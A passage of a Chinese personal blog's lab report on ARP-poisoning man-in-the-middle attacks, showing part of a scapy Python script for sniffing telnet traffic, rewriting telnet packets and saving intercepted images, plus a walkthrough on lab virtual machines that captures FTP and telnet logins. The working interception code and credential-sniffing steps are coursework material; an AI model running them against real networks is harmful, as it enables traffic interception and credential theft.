class="comment">#raw=re.sub(u"([^\u4e00-\u9fa5\u0030-\u0039\u0041-\u005a\u0061-\u007a])","",raw)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(raw):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> src == clientIP:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(raw) + <span class="number">1</span>):</span><br><span class="line">            print(raw[i - <span class="number">1</span>], end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">48</span> == <span class="number">0</span>:</span><br><span class="line">                print()</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Welcome'</span> <span class="keyword">in</span> raw:</span><br><span class="line">            isCnted = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> isCnted:</span><br><span class="line">            print(<span class="number">38</span> * <span class="string">'-'</span> + <span class="string">"Establish connection"</span> + <span class="number">38</span> * <span class="string">'-'</span>)</span><br><span class="line">            isCnted = <span class="literal">False</span></span><br><span class="line">        print(<span class="number">48</span> * <span class="string">' '</span>, end=<span class="string">''</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(raw) + <span class="number">1</span>):</span><br><span class="line">            print(raw[i - <span class="number">1</span>], end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">48</span> == <span class="number">0</span>:</span><br><span class="line">                print()</span><br><span class="line">                print(<span class="number">48</span> * <span class="string">' '</span>, end=<span class="string">''</span>)</span><br><span class="line">        print()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'logout'</span> <span class="keyword">in</span> raw:</span><br><span class="line">            print(<span class="number">37</span> * <span class="string">'-'</span> + <span class="string">"Connection interrupted"</span> + <span class="number">37</span> * <span class="string">'-'</span>)</span><br><span class="line">            isCnted = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">telnetReplace</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="string">'''telnet替换内容为字母Z'''</span></span><br><span class="line">    <span class="keyword">global</span> clientIP, serverIP, isCnted, interface, clientMAC, serverMAC, localMAC</span><br><span class="line">    esrc = pkt[Ether].src</span><br><span class="line">    ipsrc = pkt[IP].src</span><br><span class="line">    ipdst = pkt[IP].dst</span><br><span class="line">    raw = str(pkt[TCP].payload)</span><br><span class="line">    <span class="keyword">if</span> esrc == clientMAC <span class="keyword">and</span> ipsrc == clientIP <span class="keyword">and</span> ipdst == serverIP:</span><br><span class="line">        print(<span class="string">"Original Packet. "</span>)</span><br><span class="line">        print(<span class="string">"Source IP : "</span>, pkt[IP].src)</span><br><span class="line">        print(<span class="string">"Destination IP :"</span>, pkt[IP].dst)</span><br><span class="line"></span><br><span class="line">        a = IP(src=clientIP, dst=serverIP)</span><br><span class="line">        b = TCP(sport=pkt[IP].sport, dport=pkt[IP].dport)</span><br><span class="line">        pkt[TCP].payload = <span class="string">'Z'</span></span><br><span class="line">        data = <span class="string">'Z'</span></span><br><span class="line">        newpkt = a / b / data</span><br><span class="line">        <span class="keyword">del</span> newpkt[IP].chksum</span><br><span class="line">        <span class="keyword">del</span> newpkt[TCP].chksum</span><br><span class="line">        <span class="keyword">del</span> newpkt[IP].len</span><br><span class="line">        print(newpkt)</span><br><span class="line">        print(<span class="string">"Spoofed Packet.  "</span>)</span><br><span class="line">        print(<span class="string">"Source IP : "</span>, newpkt[IP].src)</span><br><span class="line">        print(<span class="string">"Destination IP :"</span>, newpkt[IP].dst)</span><br><span class="line">        send(newpkt)</span><br><span class="line">    <span class="keyword">elif</span> esrc == serverMAC <span class="keyword">and</span> ipsrc == serverIP <span class="keyword">and</span> ipdst == clientIP:</span><br><span class="line">        a = IP(src=serverIP, dst=clientIP)</span><br><span class="line">        b = TCP(sport=pkt[IP].sport, dport=pkt[IP].dport)</span><br><span class="line">        data = pkt[TCP].payload</span><br><span class="line">        newpkt = a / b / data</span><br><span class="line">        send(newpkt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">imageSniff</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="string">'''嗅探图片并保存在本地'''</span></span><br><span class="line">    <span class="keyword">global</span> clientIP</span><br><span class="line">    ipsrc = pkt[IP].src</span><br><span class="line">    ipdst = pkt[IP].dst</span><br><span class="line">    <span class="keyword">if</span> ipsrc != clientIP <span class="keyword">and</span> ipdst != clientIP:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    data = str.encode(str(pkt[TCP].payload))</span><br><span class="line">    jpgs = re.findall(re_jpg, data)</span><br><span class="line">    pngs = re.findall(re_png, data)</span><br><span class="line">    <span class="keyword">for</span> jpg <span class="keyword">in</span> jpgs:</span><br><span class="line">        now = time.time()</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'jpg/'</span> + str(now) + <span class="string">'.jpg'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(jpg)</span><br><span class="line">            print(str(now) + <span class="string">'.jpg'</span>)</span><br><span class="line">    <span class="keyword">for</span> png <span class="keyword">in</span> pngs:</span><br><span class="line">        now = time.time()</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'png/'</span> + str(now) + <span class="string">'.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(jpg)</span><br><span class="line">            print(str(now) + <span class="string">'.png'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> clientIP, serverIP, interface, clientMAC, serverMAC, localMAC</span><br><span class="line">    print(<span class="string">"这是系统可用设备的列表:\n"</span>)</span><br><span class="line">    sn = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> interface <span class="keyword">in</span> netifaces.interfaces():</span><br><span class="line">        print(<span class="string">"%d.%-10s \033[92m%-10s \033[0m"</span> %</span><br><span class="line">              (sn, interface, netifaces.ifaddresses(interface)[<span class="number">2</span>][<span class="number">0</span>][<span class="string">'addr'</span>]))</span><br><span class="line">        sn += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> netifaces.interfaces():</span><br><span class="line">        print(<span class="string">"检测不到网卡设备"</span>)</span><br><span class="line">        print(<span class="string">"[*] Exiting..."</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        interface = input(<span class="string">"\n[*] 请输入要在该主机上运行ARP毒化的接口名称: "</span>)</span><br><span class="line">        <span class="keyword">if</span> interface <span class="keyword">not</span> <span class="keyword">in</span> netifaces.interfaces():</span><br><span class="line">            print(<span class="string">"[!] 找不到该接口，请检查接口名称"</span>)</span><br><span class="line">            print(<span class="string">"[*] Exiting..."</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        serverIP = input(<span class="string">"[*] 请输入serverIP: "</span>)</span><br><span class="line">        clientIP = input(<span class="string">"[*] 请输入clientIP: "</span>)</span><br><span class="line">        localMAC = netifaces.ifaddresses(interface)[<span class="number">17</span>][<span class="number">0</span>][<span class="string">'addr'</span>]</span><br><span class="line">        serverMAC = ArpPoison.getMAC(interface, serverIP)</span><br><span class="line">        clientMAC = ArpPoison.getMAC(interface, clientIP)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"\n[*] 用户请求中断"</span>)</span><br><span class="line">        print(<span class="string">"[*] Exiting..."</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#创建一个线程运行exploit()函数</span></span><br><span class="line">    th = threading.Thread(target=exploit)</span><br><span class="line">    th.setDaemon(<span class="literal">True</span>)  <span class="comment">#把当前进程设置为守护线程，主线程执行完毕，子线程均停止</span></span><br><span class="line">    th.start()</span><br><span class="line">    <span class="comment">#主线程运行</span></span><br><span class="line">    mitm = ArpPoison(interface, serverIP, clientIP)</span><br><span class="line">    mitm.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+<h2 id="实验配置"><a class="markdownIt-Anchor" href="#实验配置"></a> 实验配置</h2>
+<ul>
+<li>
+<p>攻击机为Linux kali 5.3.0，IP为192.168.2.207</p>
+<p>初始ARP缓存表</p>
+<img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325222344205.png" alt="image-20200325222344205" style="zoom: 150%;">
+</li>
+<li>
+<p>受害机A(客户机)为SEEDUbuntu16，IP为192.168.2.101</p>
+<p>初始ARP缓存表</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325222441149.png" alt="image-20200325222441149"></p>
+</li>
+<li>
+<p>网关机B(服务机)为SEEDUbuntu16，IP为192.168.2.244</p>
+<p>初始ARP缓存表</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325222554498.png" alt="image-20200325222554498"></p>
+</li>
+<li>
+<p>python 3.7.6</p>
+</li>
+</ul>
+<h2 id="检查arp表变化"><a class="markdownIt-Anchor" href="#检查arp表变化"></a> 检查ARP表变化</h2>
+<p><a href="http://xn--newMitM-cb1ux83c.py">运行newMitM.py</a></p>
+<p>作用机理是kali攻击机不断（间隔为1.5s）向外广播Arp响应数据报（op=2，其中dstMAC=“ff:ff:ff:ff:ff:ff”，达到短时间就毒化ARP的效果</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3  newMitM.py</span><br></pre></td></tr></table></figure></div>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325223118966.png" alt="image-20200325223118966"></p>
+<p>主机A(192.168.2.101)ARP表如下</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325223316269.png" alt="image-20200325223316269"></p>
+<p>主机B(192.168.2.244)ARP变化如下</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325223452300.png" alt="image-20200325223452300"></p>
+<p>可见A、B的对向MAC地址均指向kali攻击机</p>
+<p>wireshark查看kali数据包</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325224407601.png" alt></p>
+<p>主机A数据包</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325224413307.png" alt="image-20200325224413307"></p>
+<p>主机B数据包</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325224526302.png" alt="image-20200325224526302"></p>
+<h2 id="嗅探数据包"><a class="markdownIt-Anchor" href="#嗅探数据包"></a> 嗅探数据包</h2>
+<p>打开IP转发功能</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">"sudo sysctl net.ipv4.ip_forward=1"</span>)</span><br></pre></td></tr></table></figure></div>
+<p>A Ping B：</p>
+<p>在kali wireshark捕获ICMP数据包</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225320127.png" alt="image-20200325225320127"></p>
+<p>并且为其转发</p>
+<p>A:</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225507952.png" alt="image-20200325225507952"></p>
+<p>B：</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225442543.png" alt="image-20200325225442543"></p>
+<h2 id="mitm攻击"><a class="markdownIt-Anchor" href="#mitm攻击"></a> MITM攻击</h2>
+<h3 id="嗅探ftp报文密码"><a class="markdownIt-Anchor" href="#嗅探ftp报文密码"></a> 嗅探FTP报文密码</h3>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225646459.png" alt="image-20200325225646459"></p>
+<p>将ftpSniff所在行注释去掉</p>
+<p>A登陆B的ftp</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.2.244</span><br><span class="line">seed</span><br><span class="line">dess</span><br></pre></td></tr></table></figure></div>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225907965.png" alt="image-20200325225907965"></p>
+<p>python程序捕捉到账号密码</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325225954356.png" alt="image-20200325225954356"></p>
+<p>报文查看TCP流</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325230323170.png" alt="image-20200325230323170"></p>
+<p>账号和USER在同一个报文里，密码和PASS在同一个报文里，很容易被嗅探到</p>
+<h3 id="嗅探telnet密码"><a class="markdownIt-Anchor" href="#嗅探telnet密码"></a> 嗅探telnet密码</h3>
+<p>去掉exploit()函数关于telnetSniff的注释</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200401101056472.png" alt="image-20200401101056472"></p>
+<p>主机A向B进行telenet登陆：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.2.244</span><br></pre></td></tr></table></figure></div>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325231226279.png" alt="image-20200325231226279"></p>
+<p>嗅探到的数据流在屏幕上显示</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325231455436.png" alt="image-20200325231455436"></p>
+<p>左边一列是主机A，右边一列是主机B</p>
+<p>可以看见输入字符边输入边回显，密码则没有回显，这与FTP大不相同</p>
+<p>查看wireshark数据流</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325231805934.png" alt="image-20200325231805934"></p>
+<p>红色代表主机A向B发送的数据内容，蓝色则是B，各数据段分散开来。</p>
+<h3 id="telnet替换内容为字母z"><a class="markdownIt-Anchor" href="#telnet替换内容为字母z"></a> telnet替换内容为字母Z</h3>
+<p>从上面我们可以看到telnet输入一个字符就回显该字符，尝试替换该字符</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325232353403.png" alt="image-20200325232353403"></p>
+<p>将exploit的这两行注释去掉</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200401101129803.png" alt="image-20200401101129803"></p>
+<p>首先进行A向B的telnet连接</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325232530123.png" alt="image-20200325232530123"></p>
+<p>然后运行python程序</p>
+<p>其中下面的代码让kali攻击机停止转发功能</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(&quot;sudo sysctl net.ipv4.ip_forward&#x3D;0&quot;)</span><br></pre></td></tr></table></figure></div>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325232813792.png" alt="image-20200325232813792"></p>
+<p>尝试在A中输入字符，发现无法回显</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325233152784.png" alt="image-20200325233152784"></p>
+<p>主机B收到了内容被替换为Z的数据包</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325233413549.png" alt="image-20200325233413549"></p>
+<p>主机A没有收到回应</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325233605455.png" alt="image-20200325233605455"></p>
+<p>关掉程序</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325233728976.png" alt="image-20200325233728976"></p>
+<p>A的终端界面依然无法显示任何字符，</p>
+<p>过两三分钟后，由于A获取不到信息，重新发送了ARP报文，当获取B的正确的MAC地址，就可以正常显示字符了</p>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325234234260.png" alt="image-20200325234234260"></p>
+<h1 id="实验心得"><a class="markdownIt-Anchor" href="#实验心得"></a> 实验心得</h1>
+<p>本次实验通过进一步学习scapy编程掌握了制包、抓包、改包，实现了ARP毒化的MITM攻击。然而有点奇怪的是，在telnet替换内容为字母Z实验中，理应得到主机B回显的内容却未能得到响应，这着实令人费解。。。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/scapy/" rel="tag"><i class="fa fa-tag"></i> scapy</a>
+          
+        </div>
+      
+		<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/posts/4026efe8/">MITM攻击之ARP毒化</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Asymptotic-freedom 的个人博客">Asymptotic-freedom</a></p>
+  <p><span>发布时间:</span>2020年03月28日 - 23:40</p>
+  <p><span>最后更新:</span>2022年04月09日 - 23:16</p>
+  <p><span>原始链接:</span><a href="/posts/4026efe8/" title="MITM攻击之ARP毒化">https://asymptotic-freedom.xyz/posts/4026efe8/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://asymptotic-freedom.xyz/posts/4026efe8/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+      
+		</div>
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/a87e5e21/" rel="next" title="uCoreOs lab2 实验报告">
+                <i class="fa fa-chevron-left"></i> uCoreOs lab2 实验报告
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/5acb07a3/" rel="prev" title="scapy实现TCP Attacks">
+                scapy实现TCP Attacks <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Asymptotic-freedom" />
+            
+              <p class="site-author-name" itemprop="name">Asymptotic-freedom</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                
+				<a href="/archives/">
+              
+                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Aurthoria" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.jianshu.com/u/964586dd07f2" target="_blank" title="简书">
+                      
+                        <i class="fa fa-fw fa-edit"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/atom.xml" target="_blank" title="RSS">
+                      
+                        <i class="fa fa-fw fa-rss"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <script type="text/javascript" src="//rf.revolvermaps.com/0/0/8.js?i=5te927ym7vp&amp;m=0&amp;c=ff0000&amp;cr1=ffffff&amp;f=arial&amp;l=33" async="async"></script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实验目的"><span class="nav-number">1.</span> <span class="nav-text"> 实验目的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验过程"><span class="nav-number">2.</span> <span class="nav-text"> 实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#python代码"><span class="nav-number">2.1.</span> <span class="nav-text"> python代码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#arppoisonpy"><span class="nav-number">2.1.1.</span> <span class="nav-text"> ArpPoison.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#newmitmpy"><span class="nav-number">2.1.2.</span> <span class="nav-text"> newMitM.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验配置"><span class="nav-number">2.2.</span> <span class="nav-text"> 实验配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检查arp表变化"><span class="nav-number">2.3.</span> <span class="nav-text"> 检查ARP表变化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#嗅探数据包"><span class="nav-number">2.4.</span> <span class="nav-text"> 嗅探数据包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mitm攻击"><span class="nav-number">2.5.</span> <span class="nav-text"> MITM攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#嗅探ftp报文密码"><span class="nav-number">2.5.1.</span> <span class="nav-text"> 嗅探FTP报文密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#嗅探telnet密码"><span class="nav-number">2.5.2.</span> <span class="nav-text"> 嗅探telnet密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#telnet替换内容为字母z"><span class="nav-number">2.5.3.</span> <span class="nav-text"> telnet替换内容为字母Z</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验心得"><span class="nav-number">3.</span> <span class="nav-text"> 实验心得</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Asymptotic-freedom</span>
+
+  
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+  </div>
+</div>
+
+
+
+
+
+
+
+
+
+  <script src='https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+	
+
+    
+	
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/fastclick/1.0.6/fastclick.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery.lazyload/1.9.3/jquery.lazyload.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
